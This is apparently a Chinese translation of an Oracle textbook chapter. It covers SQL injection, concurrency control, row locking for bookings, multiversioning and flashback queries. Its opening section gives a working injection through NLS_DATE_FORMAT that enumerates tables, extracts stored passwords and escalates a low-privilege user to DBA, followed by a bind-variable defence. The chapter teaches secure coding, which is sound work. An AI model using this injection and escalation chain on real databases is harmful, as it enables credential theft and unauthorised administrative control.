# SQL 注入攻击与防御示例分析

## 攻击过程演示

此前看起来相当重要的 `USER_PW` 表，请记住，用户并不知道它的存在。然而，权限极低的用户却有权访问 `INJ` 例程：

```
SQL> conn system/foo@PDB1
Connected.
SQL> create user dev identified by dev_pwd;
User created.
SQL> grant create session to dev;
Grant succeeded.
SQL> grant create procedure to dev;
Grant succeeded.
SQL> grant execute on pwd_mgr.inj to dev;
Grant succeeded.
```

因此，恶意的开发人员/用户可以简单地执行

```
SQL> connect dev/dev_pwd@PDB1
Connected.
SQL> alter session set nls_date_format = '"''union select tname from tab--"';
Session altered.
SQL> set serverout on
SQL> exec pwd_mgr.inj( sysdate )
Here's the output:
select username
from all_users
where
created = ''union select tname from tab--'
USER_PW.....
PL/SQL procedure successfully completed.
```

在上述代码中，`select` 语句执行了这个（不返回任何行的）语句：

```
select username from all_users where created =''
```

然后它通过 `UNION` 与以下语句结合：

```
select tname from tab
```

注意最后的 `--'` 部分。在 SQL*Plus 中，双破折号是注释；因此它注释掉了最后的引号，这是使语句语法正确所必需的。

## 漏洞分析

现在，那个 `NLS_DATE_FORMAT` 很有趣——大多数人甚至不知道可以在 `NLS_DATE_FORMAT` 中包含字符串字面量。（哎呀，许多人甚至不知道即使没有这个“技巧”也可以那样改变日期格式。他们也不知道即使没有 `ALTER SESSION` 权限也可以更改会话（以设置 `NLS_DATE_FORMAT`）！）恶意用户在此所做的就是诱骗 *你的* 代码，*使用你所拥有的权限集* 来查询一个你本不希望他们查询的表。`TAB` 字典视图将其视图限制在当前模式可看到的表集。当用户运行该过程时，用于授权的当前模式是该过程的所有者（简而言之，是他们，而不是你）。他们现在可以看到该模式中存在哪些表。他们看到了 `USER_PW` 表并说：“嗯，听起来很有趣。” 于是，他们尝试访问该表：

```
SQL> select * from pwd_mgr.user_pw;
select * from pwd_mgr.user_pw
*
ERROR at line 1:
ORA-00942: table or view does not exist
```

恶意用户无法直接访问该表；他们缺少对该表的 `SELECT` 权限。不过别担心，还有另一种方法。用户想知道该表中的列。以下是了解该表结构的一种方法：

```
SQL> alter session set nls_date_format = '"''union select tname||''/''||cname from col--"';
Session altered.
SQL> exec pwd_mgr.inj( sysdate )
select username
from all_users
where
created = ''union select tname||'/'||cname from col--'
USER_PW/PW.....
USER_PW/UNAME.....
PL/SQL procedure successfully completed.
```

好了，我们现在知道列名了。既然知道了该模式中表的名称和列名，我们就可以再次更改 `NLS_DATE_FORMAT` 来查询该表——而不是字典表。因此，恶意用户接下来可以执行以下操作：

```
SQL> alter session set nls_date_format = '"''union select uname||''/''||pw from user_pw--"';
Session altered.
SQL> exec pwd_mgr.inj( sysdate )
select username
from all_users
where
created = ''union select uname||'/'||pw from user_pw--'
TKYTE/TOP SECRET.....
PL/SQL procedure successfully completed.
```

看，就是这样——那个邪恶的开发人员/用户现在拥有了你敏感的用户名和密码信息。更进一步，如果这个开发人员拥有 `CREATE PROCEDURE` 权限怎么办？可以安全地假设他们有（毕竟他们是开发人员）。他们能在这个例子的基础上走得更远吗？当然可以。那个看似无害的存储过程，至少保证了对 `PWD_MGR` 模式拥有读取权限的所有内容的读取访问；并且如果利用此漏洞的账户拥有 `CREATE PROCEDURE`（它确实有），该存储过程允许他们执行 `PWD_MGR` 能够执行的任何命令！

> **注意**
> 本示例假设用户 `PWD_MGR` 已被授予带有 `ADMIN OPTION` 的 `DBA` 角色。

## 进阶利用

然后，作为开发人员，我们将创建一个授予 `DBA` 的函数。关于这个函数有两个重要事实：它是一个*调用者权限例程*，意味着它将使用执行该例程的人员的权限来执行；它是一个*编译指示* `autonomous_transaction` *例程*，意味着它会创建一个在例程返回前提交或回滚的子事务，因此使其有资格从 SQL 中调用。以下是该函数：

```
SQL> create or replace function foo
return varchar2
authid CURRENT_USER
as
pragma autonomous_transaction;
begin
execute immediate 'grant dba to dev';
return null;
end;
/
Function created.
```

现在我们要做的就是“欺骗” `PWD_MGR`（一个可以授予他人 DBA 权限的 DBA）来运行这个函数。鉴于我们为了利用 SQL 注入漏洞所做的工作，这很容易。我们将设置我们的 `NLS_DATE_FORMAT` 以包含对此函数的引用，并将对其的执行权限授予 `PWD_MGR`：

```
SQL> alter session set nls_date_format = '"''union select dev.foo from dual--"';
Session altered.
SQL> grant execute on foo to pwd_mgr;
Grant succeeded.
```

然后，瞧！我们获得了 DBA 权限：

```
SQL> select * from session_roles;
no rows selected
SQL> set serverout on
SQL> exec pwd_mgr.inj( sysdate )
select username
from all_users
where
created = ''union select dev.foo from dual--'
.....
PL/SQL procedure successfully completed.
```

现在我们需要重新连接到数据库，以便为会话实例化新授予的权限：

```
SQL> conn dev/dev_pwd@PDB1
SQL> select * from session_roles;
ROLE
--------------------------------------------------------------------------------
PDB_DBA
CONNECT
RESOURCE
SODA_APP
SELECT_CATALOG_ROLE
HS_ADMIN_SELECT_ROLE
AQ_ADMINISTRATOR_ROLE
AQ_USER_ROLE
ADM_PARALLEL_EXECUTE_TASK
GATHER_SYSTEM_STATISTICS
```

## 防御建议

那么，你该如何保护自己呢？通过使用绑定变量。例如：

```
SQL> conn pwd_mgr/pwd_mgr_pwd@PDB1
SQL> create or replace procedure NOT_inj( p_date in date )
as
l_username   all_users.username%type;
c            sys_refcursor;
l_query      varchar2(4000);
begin
l_query := '
select username
from all_users
where created = :x';
dbms_output.put_line( l_query );
open c for l_query USING P_DATE;
for i in 1 .. 5
loop
fetch c into l_username;
exit when c%notfound;
dbms_output.put_line( l_username || '.....' );
end loop;
close c;
end;
/
Procedure created.
SQL> set serverout on
SQL> alter session set nls_date_format = '"''union select dev.foo from dual--"';
Session altered.
SQL> exec NOT_inj(sysdate)
select username
from all_users
where created = :x
PL/SQL procedure successfully completed.
```


请注意，先前的输出不包含任何注入的恶意代码。这是一个简单明了的事实：如果你使用`绑定变量`，就不会遭受 SQL 注入攻击。如果你**不**使用`绑定变量`，你就必须一丝不苟地检查每一行代码，并像一个邪恶的天才（一个对`Oracle`的*所有*一切都了如指掌的人）那样思考，看看是否有办法攻击那段代码。我不知道你怎么想，但如果我能确定我 99.9999%的代码不会受到 SQL 注入的影响，而我只需要担心剩下的 0.0001%（由于某种原因无法使用`绑定变量`的代码），那么我晚上会睡得安稳得多，远胜于不得不担心 100%的代码都可能受到 SQL 注入攻击的情况。

无论如何，在我在本节开头描述的那个特定项目中，重写现有代码以使用`绑定变量`是唯一可行的行动方案。由此产生的代码运行速度快了数个数量级，系统能够支持的并发用户数量也成倍增加。而且代码更安全——整个代码库都不再需要为 SQL 注入问题而进行审查。然而，这种安全性在时间和精力上付出了高昂的代价，因为我的客户不得不编写系统代码，然后`重新编写一遍`。这并非因为使用`绑定变量`困难或容易出错，只是因为他们最初没有使用，从而被迫回头修改几乎`所有`的代码。如果开发人员从一开始就明白在应用程序中使用`绑定变量`至关重要，我的客户本不必付出这个代价。

### 理解并发控制

并发控制是数据库之间有所区别的一个领域。正是这个领域将数据库与文件系统区分开来，也将不同的数据库彼此区分开来。作为一名程序员，确保你的数据库应用程序在并发访问条件下能正确工作至关重要，然而人们却一次又一次地未能对此进行测试。如果一切都按顺序发生时效果良好的技术，在所有人同时进行操作时未必能同样有效。如果你不充分了解你所使用的特定数据库如何实现`并发控制`机制，那么你将：

*   破坏数据的完整性。
*   导致应用程序在用户数量较少时运行得比应有的速度慢。
*   降低应用程序扩展到大量用户的能力。

请注意，我并不是说“你可能会……”或“你面临……的风险”，而是说你*必然*会做这些事。你甚至会在不知不觉中就做了这些事。没有正确的`并发控制`，你将破坏数据库的完整性，因为某些在隔离状态下有效的方法在多用户环境中将不会如你所愿地工作。你的应用程序运行速度将比应有的慢，因为你最终会等待数据。你的应用程序将因为`锁定`和争用问题而失去扩展能力。随着访问资源的队列变长，等待时间也会越来越长。

这里的一个类比是收费站前的车辆排队。如果车辆以有序、可预测的方式一辆接一辆地到达，就不会出现排队。如果许多车辆同时到达，队列就会开始形成。此外，等待时间并不随着收费站车辆数量的增加而线性增长。超过某一点后，相当多的额外时间会花在“管理”排队等待的人员以及为他们服务上（在数据库中的对应情况就是上下文切换）。

并发问题是最难追踪的；这个问题类似于调试一个多线程程序。该程序在调试器的受控、人工环境中可能运行良好，但在现实世界中却会灾难性地崩溃。例如，在竞态条件下，你会发现两个线程可能最终同时修改同一个数据结构。这类错误极难追踪和修复。如果你只是在隔离状态下测试应用程序，然后将其部署给数十个并发用户，你很可能会（痛苦地）暴露出一个未被发现的并发问题。

在接下来的两节中，我将举两个小例子，说明对`并发控制`缺乏了解如何会毁掉你的数据或抑制性能和可扩展性。

#### 实现锁定

数据库使用`锁`来确保在任何时候，最多只有一个事务在修改给定的数据。基本上，`锁`是实现并发的机制——如果没有某种锁定模型来防止对同一行进行并发更新（例如），那么多用户访问在数据库中就不可能实现。然而，如果过度使用或使用不当，`锁`实际上会抑制并发。如果你或数据库本身不必要地锁定了数据，能够同时执行操作的人数就会减少。因此，要开发一个可扩展、正确的应用程序，理解什么是`锁定`以及它在你所使用的数据库中如何工作至关重要。

同样至关重要的是，你要理解每个数据库实现`锁定`的方式不同。有些数据库使用`页级锁定`，有些使用`行级锁定`；有些实现会将`锁`从`行级`升级到`页级`，有些则不会；有些使用`读锁`，有些则不使用；有些数据库通过`锁定`实现`可串行化`事务，而另一些则通过数据的`读一致性`视图（不使用`锁`）来实现。如果你不了解这些机制如何工作，这些细微的差异可能会膨胀为你应用程序中的巨大性能问题或彻头彻尾的错误。

以下几点总结了`Oracle`的`锁定`策略：

*   `Oracle`在修改时在`行级`锁定数据。不会发生向`数据块`或`表级`的`锁升级`。
*   `Oracle`绝不会仅仅为了读取数据而锁定数据。简单的读取操作不会在数据行上放置`锁`。
*   数据的写入者不会阻塞数据的读取者。让我重复一遍：*读*操作不会被*写*操作阻塞。这与许多其他数据库有着根本的不同，在那些数据库中，读操作会被写操作阻塞。虽然这听起来是一个极其积极的特性（而且通常确实是），但如果你对此理解不透彻，并试图在应用程序中通过应用逻辑来强制实施完整性约束，*你很可能会做错*。
*   数据的写入者只在另一个写入者已经锁定了其目标行时才会被阻塞。数据的读取者永远不会阻塞数据的写入者。

在开发应用程序时，你必须考虑这些事实，同时你也要意识到这个策略是`Oracle`特有的；每个数据库在`锁定`方法上都有细微的差异。即使你在应用程序中采用最基础通用的`SQL`，每个供应商所采用的`锁定`和`并发控制`模型也注定了会存在差异。一个不理解其数据库如何处理`并发`的开发人员，肯定会遇到数据完整性问题。（当开发人员从另一个数据库转到`Oracle`，或者反之，并且在应用程序中忽略了不同的`并发`机制时，这种情况尤其常见。）


## 防止丢失更新

Oracle 非阻塞机制的一个副作用是，如果你确实想确保一次只有一个用户能访问某一行，那么作为开发人员，你需要自己完成一些额外的工作。

### 一个并发预订问题示例

一位开发人员向我展示了一个他刚刚开发并正在部署的资源调度程序（用于会议室、投影仪等）。该应用程序实现了一个业务规则，以防止在任何给定时间段内将一个资源分配给多个人。也就是说，应用程序中包含了专门检查是否有其他用户先前已预订该时间段的代码（至少开发人员是这么认为的）。这段代码查询了 `SCHEDULES` 表，如果没有发现与该时间段重叠的行，就插入新行。因此，开发人员基本上关注的是两张表：

```sql
create table resources
( resource_name varchar2(25) primary key,
other_data    varchar2(25) );
create table schedules
( resource_name varchar2(25) references resources,
start_time    date,
end_time      date );
```

并且，在将一个房间预订插入 `SCHEDULES` 表后，并在提交之前，应用程序会立即进行如下查询：

```sql
select count(*)
from schedules
where resource_name = :resource_name
and (start_time < :new_end_time and end_time > :new_start_time);
```

这看起来简单且万无一失（至少对开发人员来说）；如果计数返回为 1，这个房间就归你了。如果返回值大于 1，你就无法预订该时间段。当我了解到他的逻辑后，我设置了一个非常简单的测试来向他展示当应用程序上线时会发生错误——这种错误在事后将非常难以追踪和诊断。你会坚信这*一定*是数据库的 bug。

我所做的只是让另一个人使用他旁边的终端。两人导航到同一个屏幕，并数到三时，各自点击了“Go”按钮，尝试预订同一个房间的重叠时间段。结果两个人的预订都成功了。这个在孤立环境下完美工作的逻辑，在多用户环境中失败了。部分原因在于 Oracle 的非阻塞读取。任何一个会话都没有阻塞另一个会话。两个会话都简单地运行了查询，然后执行了预订房间的逻辑。即使另一个会话已经开始修改 `SCHEDULES` 表（更改在提交前对另一个会话不可见），他们仍然可以运行查询来查找预订记录。由于对每个用户来说，他们看起来都没有尝试修改 `SCHEDULES` 表中的同一行，因此他们永远不会相互阻塞，于是业务规则就无法强制执行它本应强制的内容。

### 解决方案：手动序列化

这令开发人员感到惊讶——他编写过许多数据库应用程序——因为他的背景是使用读锁的数据库。也就是说，数据的读取者会被数据的写入者阻塞，而数据的写入者也会被该数据的并发读取阻塞。在他的世界里，其中一个事务本应阻塞另一个——或者应用程序可能会发生死锁。但无论如何，总会有一个事务最终失败。

因此，开发人员需要一种在多用户环境中强制执行业务规则的方法——一种确保同一时间只有一个人对给定资源进行预订的方法。在这个案例中，解决方案是他自己进行一些序列化。除了执行前面的 `count(*)` 查询外，开发人员首先执行了以下操作：

```sql
select * from resources where resource_name = :resource_name FOR UPDATE;
```

他在这里做的是，在安排资源（房间）*之前*立即锁定它，换句话说，在查询该资源的 `SCHEDULES` 表之前。通过锁定他试图安排的资源，开发人员确保没有其他人同时修改此资源的日程表。任何其他想要对同一资源执行 `SELECT FOR UPDATE` 的人都必须等待，直到事务提交，此时他们才能看到日程表。重叠日程的风险被消除了。

### 并发性与理解

开发人员必须理解，在多用户环境中，他们有时必须采用类似于多线程编程中使用的技术。在这个案例中，`FOR UPDATE` 子句的作用类似于信号量。它为该特定行在 `RESOURCES` 表上的访问进行序列化——确保不会有两个人同时安排它。

使用 `FOR UPDATE` 方法仍然具有高度的并发性，因为可能有成千上万的资源可供预订。我们所做的只是确保在任何时候只有一个人修改一个资源。这是一个罕见的情况，我们确实需要手动锁定我们实际上不会更新的数据。你需要能够识别在哪里必须手动加锁，也许同样重要的是，在哪些情况下不要这样做（我稍后会给出一个例子）。此外，`FOR UPDATE` 子句不会像在其他数据库中那样阻止其他人读取数据。因此，这种方法可以很好地扩展。

### 跨数据库移植与并发意识

本节中描述的问题在将应用程序从一个数据库移植到另一个数据库时具有巨大的影响（我将在本章稍后回到这个主题），这些问题一次又一次地让人们栽跟斗。例如，如果你在其他数据库（写入者阻塞读取者，反之亦然）方面经验丰富，你可能已经变得依赖这个事实来保护你免受数据完整性问题的影响。*缺乏*并发性是一种保护自己的方式。这是许多非 Oracle 数据库的工作方式。而在 Oracle 中，并发性至高无上，你必须意识到，因此事情的发生方式会有所不同（否则就要承担后果）。

我曾参与过设计会议，开发人员即使在被展示了这类例子后，也嘲笑他们需要真正理解这一切是如何工作的想法。他们的回应是：“我们只是在我们的 Hibernate 应用程序中勾选‘事务性’框，它就会为我们处理所有事务性事情。我们不需要知道这些东西。”我对他们说：“那么 Hibernate 会为 SQL Server、DB2 和 Oracle 生成不同的代码吗？完全不同的代码、不同数量的 SQL 语句、不同的逻辑？”他们说不会，但它会是事务性的。这没有抓住重点。这里的事务性仅仅意味着你支持提交和回滚，并不意味着你的代码在事务上是一致的（请理解为“并不意味着你的代码是正确的”）。无论你使用什么工具或框架来访问数据库，如果你想避免破坏数据，了解并发控制都是至关重要的。

### 何时需要关注锁定

99% 的情况下，锁定是完全透明的，你无需关心它。你必须训练自己识别的就是那剩下的 1%。对于这个问题，没有简单的“如果你做了 X，就需要做 Y”清单。成功的并发控制在于理解你的应用程序在多用户环境中将如何表现，以及它在你的数据库中将如何表现。

当我们讲到有关锁定和并发控制的章节时，我们会更深入地探讨这个话题。在那里你将了解到，本节介绍的这种完整性约束强制实施（你必须强制执行一个跨越单表多行或在多个表之间的规则，如参照完整性约束），是你必须始终特别注意的情况，并且很可能不得不诉诸于手动锁定或其他技术，以确保在多用户环境中的数据完整性。


### 多版本机制

这个主题与并发控制紧密相关，因为它构成了 Oracle 并发控制机制的基础。Oracle 采用的是多版本、读一致性的并发模型。在第 7 章中，我们将更详细地介绍其技术细节，但本质上，它是一种使 Oracle 能够提供以下功能的机制：

*   读一致的查询：产生的结果相对于某个时间点是一致的查询。
*   非阻塞的查询：查询永远不会被数据的写入者阻塞，就像在其他数据库中那样。

这是 Oracle 数据库中两个非常重要的概念。术语 `多版本机制` 基本上描述了 Oracle 能够同时维护数据库中数据的多个版本的能力。术语 `读一致性` 反映了这样一个事实：Oracle 中的查询将返回从一个一致时间点的数据结果。查询使用的每个数据块都将“截至”完全相同的时间点——即使它在您执行查询期间被修改或锁定。如果您理解 `多版本机制` 和 `读一致性` 如何协同工作，您就能始终理解从数据库获得的答案。在我们更详细地探讨 Oracle 如何实现这一点之前，这里是我所知的在 Oracle 中 `演示` `多版本机制` 最简单的方式：

```sql
$ sqlplus eoda/foo@PDB1
SQL> drop table t purge;
SQL> create table t as select username, created  from all_users;
表已创建。
SQL> set autoprint off
SQL> variable x refcursor;
SQL> begin
open :x for select * from t;
end;
/
PL/SQL 过程已成功完成。
SQL> declare
pragma autonomous_transaction;
-- 您也可以在另一个
-- sqlplus 会话中执行此操作，
-- 效果是相同的
begin
delete from t;
commit;
end;
/
PL/SQL 过程已成功完成。
SQL> print x
USERNAME                  CREATED
------------------------- --------------------
SYS                       20-11 月-20
AUDSYS                    20-11 月-20
SYSTEM                    20-11 月-20
SYSBACKUP                 20-11 月-20
SYSDG                     20-11 月-20
SYSKM                     20-11 月-20
SYSRAC                    20-11 月-20
OUTLN                     20-11 月-20
REMOTE_SCHEDULER_AGENT    20-11 月-20
GSMADMIN_INTERNAL         20-11 月-20
```

表 1-1 总结了这个 `多版本机制` 示例的时序和操作。

**表 1-1** 在 Oracle 中演示 `多版本机制`

| 时间 | 操作 |
| --- | --- |
| 时间 1 | 创建表 `T` 并加载数据。 |
| 时间 2 | 打开用于从表 `T` 查询的游标 `X`。 |
| 时间 3 | 删除表 `T` 中的所有行并 `COMMIT`。 |
| 时间 4 | 从表 `T` 查询，显示表中已无行。 |
| 时间 5 | 从游标 `X` 获取数据，显示的数据是时间 2 时表 `T` 中存在的行。 |

在这个例子中，我们创建了一个测试表 `T`，并从 `ALL_USERS` 表加载了一些数据。我们在该表上打开了一个游标。我们从那个游标中*没有获取任何数据*：我们只是打开了它并保持其打开状态。

注意

请记住，Oracle 并不会“预先回答”查询。当您打开游标时，它不会将数据复制到任何地方——想象一下，如果它这么做，在一个有十亿行数据的表上打开游标需要多长时间。游标是瞬间打开的，并且它在获取过程中回答查询。换句话说，当您从游标获取数据时，它只是从表中读取数据。

在同一个会话中（或者在另一个会话中执行也可以；同样会生效），我们继续删除表中的所有数据。我们甚至对这个 `DELETE` 操作进行了 `COMMIT`。这些行消失了——但它们真的消失了吗？事实上，它们仍然可以通过游标（或使用 `AS OF` 子句的 `FLASHBACK` 查询）检索到。事实是，`OPEN` 命令返回给我们的结果集在我们打开它的那一刻就已经被确定了。在打开游标时，我们并没有触及该表中的任何一个数据块，但答案已经固定不变了。在获取数据之前，我们无法知道答案是什么；然而，从游标的视角来看，结果是不可变的。这并不是说 Oracle 在我们打开游标时将所有先前的数据复制到了其他某个位置；实际上是 `DELETE` 命令通过将数据（在 `DELETE` 之前存在的行的前映像副本）放入一个称为 `undo` 或 `rollback segment` 的数据区域中，为我们保存了数据。



## 闪回

过去，Oracle 总是决定我们的查询在哪个时间点是一致的。也就是说，Oracle 使得我们打开的任何结果集都相对于以下两个时间点之一保持最新：

*   查询被打开的时间点：这是 `READ COMMITTED` 隔离级别（我们将在第 7 章介绍 `READ COMMITTED`、`READ ONLY` 和 `SERIALIZABLE` 事务级别的区别）下的默认行为。
*   该查询所属的事务开始的时间点：这是 `READ ONLY` 和 `SERIALIZABLE` 事务级别下的默认行为。

然而，借助 Oracle 的闪回查询功能，我们可以告诉 Oracle “基于”（当然，对于可以回溯到过去的时间长度有一些合理的限制）某个时间点来执行查询。借此，你可以更直接地“看到”读一致性和多版本机制。

注意：用于长期闪回查询（回溯数月或数年）的闪回数据归档，**不使用**读一致性和多版本机制来生成数据库在过去某个时间点的数据版本。相反，它使用已存入归档的记录的前映像副本。我们将在后面的章节中回到闪回数据归档。另请注意，闪回数据归档是数据库的一项功能，无需额外许可费用即可使用。

考虑下面的例子。我们首先获取一个 `SCN`（系统改变号或系统提交号；这两个术语可互换使用）。这个 `SCN` 是 Oracle 的内部时钟：每次发生提交时，这个时钟都会向前滴答（递增）。我们也可以使用日期或时间戳，但这里 `SCN` 很容易获得且非常精确：

```sql
$ sqlplus scott/tiger@PDB1
SQL> variable scn number
SQL> exec :scn := dbms_flashback.get_system_change_number;
PL/SQL procedure successfully completed.
SQL> print scn
SCN
----------
```

注意：在你的系统上，`DBMS_FLASHBACK` 包可能有访问限制。你可能需要先对你所使用的模式授予对该包的执行权限，然后才能访问它。

我们检索了 `SCN`，以便告诉 Oracle 我们希望查询“基于”哪个时间点；我们也可以用日期或时间戳代替 `SCN`。我们希望稍后能够查询 Oracle 并查看在这个精确时间点该表中的内容。首先，让我们看看 `EMP` 表中当前的内容：

```sql
SQL> select count(*) from emp;

  COUNT(*)
----------
        14
```

现在，让我们删除所有这些信息并验证它已“消失”：

```sql
SQL> delete from emp;

14 rows deleted.

SQL> select count(*) from emp;

  COUNT(*)
----------
         0

SQL> commit;

Commit complete.
```

然而，使用带有 `AS OF SCN` 或 `AS OF TIMESTAMP` 子句的闪回查询，我们可以要求 Oracle 向我们显示在该时间点表中的内容：

```sql
SQL> select count(*),
       :scn then_scn,
       dbms_flashback.get_system_change_number now_scn
     from emp as of scn :scn;

  COUNT(*)   THEN_SCN    NOW_SCN
---------- ---------- ----------
        14   13646156   13646157
```

在 Oracle 中，你有一个名为“flashback”的命令，它利用这种底层的多版本技术，允许你将对象恢复到过去某个时间点的状态。在本例中，我们可以将 `EMP` 表恢复到删除所有信息之前的状态（作为此过程的一部分，我们需要启用行移动，这允许分配给行的 `rowid` 发生改变——这是闪回表的必要前提）：

```sql
SQL> alter table emp enable row movement;

Table altered.

SQL> flashback table emp to scn :scn;

Flashback complete.

SQL> select cnt_now, cnt_then,
       :scn then_scn,
       dbms_flashback.get_system_change_number now_scn
     from (select count(*) cnt_now from emp),
          (select count(*) cnt_then from emp as of scn :scn);

   CNT_NOW   CNT_THEN   THEN_SCN    NOW_SCN
---------- ---------- ---------- ----------
        14         14   13646156   13646786
```

这就是读一致性和多版本机制的全部意义所在。如果你不理解 Oracle 的多版本方案如何工作及其含义，你将无法充分利用 Oracle 或编写正确的 Oracle 应用程序（那些能确保数据完整性的应用程序）。

注意：闪回表功能需要 Oracle 企业版。


